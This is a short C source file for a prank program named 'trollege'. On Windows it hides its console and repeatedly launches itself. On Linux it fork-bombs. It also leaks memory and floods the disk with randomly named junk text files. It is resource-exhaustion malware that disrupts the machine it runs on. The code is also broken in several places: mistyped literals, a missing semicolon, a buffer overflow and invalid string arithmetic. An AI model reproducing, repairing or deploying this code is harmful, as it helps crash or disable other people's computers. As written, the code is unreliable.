#include <stdlib.h>
#include <stdio.h>
#ifdef __linux__
#include <sys/types.h>
#endif
#ifdef _WIN32
    #define _WIN32_WINNT 0x0500
    #include <windows.h>
#endif

//forgive me if this is trash I am new to C
int main() 
{
    #ifdef _WIN32
    HWND hWnd = GetConsoleWindow();
    ShowWindow( hWnd, SW_MINIMIZE );
    ShowWindow( hWnd, SW_HIDE );    
    #endif
    FILE *x[268435455];
    for(unsigned int i = 0; i < 268435455; i++) {
        for(int y = 0; y < 10; y++) {
            printf('\x7');
            #ifdef _WIN32
            PROCESS_INFORMATION ProcessInfo;

            STARTUPINFO StartupInfo;

            ZeroMemory(&StartupInfo, sizeof(StartupInfo));
            StartupInfo.cb = sizeof(StartupInfo);
            CreateProcess("trollege.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &StartupInfo, &ProcessInfo);
            #endif 
            #ifdef __linux__
            fork()
            #endif
        }
        if(i <= 1000) {
            malloc(1000);
        } else {
            malloc(i);
        }
        char str[10];
        for(int y = 0; y < 20; y++)
        {
            str[y] = (rand() % (126 - 32 + 1)) + 32;
        }
        x[i] = fopen(str + '.txt', 'w+');
        for(int y = 0; y < i; y++)
        {
            fputs("We do a little trolling\n", x[i]);
        }
    }
}
